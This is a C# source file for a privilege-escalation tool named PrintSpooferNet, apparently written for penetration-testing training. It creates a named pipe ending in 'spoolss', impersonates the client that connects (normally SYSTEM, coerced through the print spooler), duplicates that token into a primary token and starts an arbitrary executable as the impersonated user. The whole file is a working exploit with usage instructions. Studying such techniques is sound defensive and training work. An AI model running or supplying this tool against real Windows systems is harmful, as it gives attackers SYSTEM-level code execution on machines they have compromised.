/*
Creates a Pipe Server, waits for a connection, and impersonates the client that connects.
Uses DuplicateTokenEx to create a primary token from an impersonation token. 
Then creates a new process in the context of the impersonated user.
*/

using System;
using System.Text;
using System.Security.Principal;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }
#pragma warning disable CS0649
        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User; // CS0649 warning: Field is never assigned to
        }
#pragma warning restore CS0649

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        public enum CreationFlags
        {
            DefaultErrorMode            = 0x04000000,
            NewConsole                  = 0x00000010,
            NewProcessGroup             = 0x00000200,
            SeparateWOWVDM              = 0x00000800,
            Suspended                   = 0x00000004,
            UnicodeEnvironment          = 0x00000400,
            ExtendedStartupInfoPresent  = 0x00080000
        }

        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        // Create a pipe (inter-process shared memory) \\.\pipe\pipename
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(
            string lpName,
            uint dwOpenMode,
            uint dwPipeMode,
            uint nMaxInstances,
            uint nOutBufferSize,
            uint nInBufferSize,
            uint nDefaultTimeOut,
            IntPtr lpSecurityAttributes
        );

        // Wait for connections on a pipe                
        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(
            IntPtr hNamedPipe,
            IntPtr lpOverlapped
        );

        // Impersonate the client who connects to a pipe                        
        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(
            IntPtr hNamedPipe
        );

        // Get handle to current thread                  
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        // Open token
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            uint DesiredAccess,
            bool OpenAsSelf,
            out IntPtr TokenHandle
        );

        // Get token information (SID)
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            uint TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength
        );

        // Convert SID to a string
        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(
            IntPtr pSID,
            out IntPtr ptrSid
        );

        // Convert impersonation token to a primary token
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            uint ImpersonationLevel,
            uint TokenType,
            out IntPtr phNewToken
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory(
            [Out] StringBuilder lpBuffer,
            uint uSize
        );

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(
            out IntPtr lpEnvironment,
            IntPtr hToken,
            bool bInherit
        );

        // Create a process in the context of a primary token
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hToken,
            UInt32 dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            UInt32 dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );


        static void Main(string[] args)
        {
            if (args.Length == 0 || args.Length > 2)
            {
                Console.WriteLine("[-] Usage: PrintSpooferNet.exe pipename [path_to_exe]");
                return;
            }

            string pipeName = $"\\\\.\\pipe\\{args[0]}\\pipe\\spoolss";
            Console.WriteLine($"[*] Using pipe name: {pipeName}");

            string cmd = args.Length > 1 ? args[1] : "whoami";
            Console.WriteLine($"[*] Attempting to execute: {cmd}");

            // Create a pipe
            IntPtr hPipe = CreateNamedPipe(
                pipeName,
                3,             // PIPE_ACCESS_DUPLEX (bidirectional)
                0,             // PIPE_TYPE_BYTE and PIPE_WAIT
                10,            // 1-255
                0x1000,        // 1 page size
                0x1000,        // 1 page size
                0,             // Timeout
                IntPtr.Zero    // Allow SYSTEM and local admins to connect
            );  
            if (hPipe == IntPtr.Zero || hPipe == new IntPtr(-1))
            {
                Console.WriteLine("[-] Failed to create named pipe. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[*] Waiting for a client to connect...");

            // Wait for connections to the pipe
            bool successful_connect = ConnectNamedPipe(hPipe, IntPtr.Zero);
            if (!successful_connect)
            {
                Console.WriteLine("[-] Failed to connect named pipe. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Client connected!");

            // Impersonate incoming connections
            bool successful_impersonation = ImpersonateNamedPipeClient(hPipe);
            if (!successful_impersonation)
            {
                Console.WriteLine("[-] Failed to impersonate client. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Client impersonated!");

            // Open impersonated token to check impersonated SID
            IntPtr hToken;
            bool successful_thread_open = OpenThreadToken(
                GetCurrentThread(),
                0xF01FF, // All permissions
                false,
                out hToken
            );
            if (!successful_thread_open)
            {
                Console.WriteLine("[-] Failed to open thread token. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Thread token opened!");

            // Get token information length
            int TokenInfLength = 0;
            GetTokenInformation(
                hToken,
                1,
                IntPtr.Zero,
                TokenInfLength,
                out TokenInfLength
            );
           
            Console.WriteLine("[+] Got token information length!");

            // Get token information
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            bool got_token_inf = GetTokenInformation(
                hToken,
                1,
                TokenInformation,
                TokenInfLength,
                out TokenInfLength
            );
            if (!got_token_inf)
            {
                Console.WriteLine("[-] Failed to get token information. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Got token information!");

            // Parse token information as a TOKEN_USER struct
            TOKEN_USER? TokenUserNullable = Marshal.PtrToStructure<TOKEN_USER>(TokenInformation);
            if (TokenUserNullable == null)
            {
                Console.WriteLine("[-] Failed to parse token information.");
                return;
            }
            TOKEN_USER TokenUser = TokenUserNullable.Value;
            Console.WriteLine("[+] Parsed token information!");

            // Get SID of impersonated user
            IntPtr pStr = IntPtr.Zero;
            Boolean converted_SID = ConvertSidToStringSid(TokenUser.User.Sid, out pStr);
            if (!converted_SID)
            {
                Console.WriteLine("[-] Failed to convert SID to string format. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Retrieved pointer to SID string!");

            string impersonated_SID = Marshal.PtrToStringAuto(pStr);
            if (impersonated_SID == null)
            {
                Console.WriteLine("[-] SID string pointer returned null.");
                return;
            }
            Console.WriteLine($"[+] Found SID {impersonated_SID}");

            // Convert impersonated token to a primary token
            IntPtr hSystemToken = IntPtr.Zero;
            bool duplicated_token = DuplicateTokenEx(
                hToken,         // Impersonation token
                0xF01FF,        // Full access
                IntPtr.Zero,    // Use default security descriptor 
                2,              // Security Impersonation
                1,              // Primary token
                out hSystemToken
            );
            if (!duplicated_token)
            {
                Console.WriteLine("[-] Failed to duplicate token. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Duplicated token!");


            StringBuilder sbSystemDir = new StringBuilder(256);

            uint res1 = GetSystemDirectory(
                sbSystemDir,
                256
            );
            if(res1 == 0)
            {
                Console.WriteLine("[-] Failed to get system directory. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Got system directory!");

            IntPtr env  = IntPtr.Zero;
            bool created_env_block    = CreateEnvironmentBlock(
                out env,
                hSystemToken,
                false
            );
            if (!created_env_block || env == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create environment block. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Created environment block!");

            String impersonated_user = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine("[+] Impersonated user is: " + impersonated_user);
            RevertToSelf();

            PROCESS_INFORMATION pi  = new PROCESS_INFORMATION();
            STARTUPINFO si          = new STARTUPINFO();
            si.cb                   = Marshal.SizeOf(si);
            si.lpDesktop            = "WinSta0\\Default";

            // Start process as impersonated user
            bool created_process = CreateProcessWithTokenW(
                hSystemToken,
                (uint)LogonFlags.WithProfile,
                null,
                cmd,
                (uint)CreationFlags.UnicodeEnvironment,
                env,
                sbSystemDir.ToString(),
                ref si,
                out pi
            );
            if (!created_process)
            {
                Console.WriteLine("[-] Failed to create process. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Created process!");
        }
    }
}
